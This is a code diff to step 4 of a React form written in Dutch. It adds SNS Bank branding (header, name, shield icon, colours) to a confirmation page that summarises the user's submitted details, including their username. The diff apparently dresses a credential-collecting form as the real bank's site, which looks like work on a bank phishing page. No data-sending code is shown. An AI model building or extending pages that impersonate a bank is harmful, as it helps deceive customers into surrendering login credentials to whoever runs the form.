@@ -12,6 +12,7 @@ import { useFormStore } from '@/hooks/use-form-store';
 import { useTranslation } from '@/lib/translations';
 import { useToast } from '@/hooks/use-toast';
 import { apiRequest } from '@/lib/queryClient';
+import { CheckCircle, Shield, FileCheck } from 'lucide-react';
 
 const step4Schema = z.object({
   consent: z.boolean().refine(val => val === true, "Toestemming is verplicht"),
@@ -90,18 +91,43 @@ export default function Step4() {
   const summaryData = getSummaryData();
 
   return (
-    <div className="max-w-2xl mx-auto px-4 py-8">
-      <Card>
-        <CardContent className="pt-6">
-          <h2 className="text-2xl font-semibold mb-6 text-secondary" data-testid="step-title">
-            {t('step_4_title')}
-          </h2>
+    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-orange-50">
+      {/* SNS Header */}
+      <div className="bg-primary text-white py-4">
+        <div className="max-w-2xl mx-auto px-4">
+          <div className="flex items-center gap-3">
+            <Shield className="h-8 w-8" />
+            <div>
+              <h1 className="text-2xl font-bold" data-testid="sns-logo">SNS Bank</h1>
+              <p className="text-orange-100 text-sm">Bevestiging en verzending</p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div className="max-w-lg mx-auto px-4 py-12">
+        <Card className="shadow-2xl border-0">
+          <CardContent className="pt-8 pb-8">
+            <div className="text-center mb-8">
+              <div className="w-16 h-16 bg-primary rounded-full flex items-center justify-center mx-auto mb-4">
+                <FileCheck className="h-8 w-8 text-white" />
+              </div>
+              <h2 className="text-2xl font-bold text-secondary mb-2" data-testid="step-title">
+                Bevestiging
+              </h2>
+              <p className="text-muted-foreground text-sm">
+                Controleer je gegevens en voltooi het proces
+              </p>
+            </div>
           
           {/* Summary Section */}
-          <div className="bg-accent rounded-lg p-6 mb-6">
-            <h3 className="text-lg font-semibold mb-4 text-accent-foreground" data-testid="summary-title">
-              Overzicht van je gegevens
-            </h3>
+          <div className="bg-blue-50 border border-blue-200 rounded-lg p-6 mb-6">
+            <div className="flex items-center gap-3 mb-4">
+              <CheckCircle className="h-5 w-5 text-blue-600" />
+              <h3 className="text-lg font-semibold text-blue-900" data-testid="summary-title">
+                Overzicht van je gegevens
+              </h3>
+            </div>
             <div className="space-y-3 text-accent-foreground">
               <div data-testid="summary-username">
                 <strong>Gebruikersnaam:</strong> {summaryData.username}
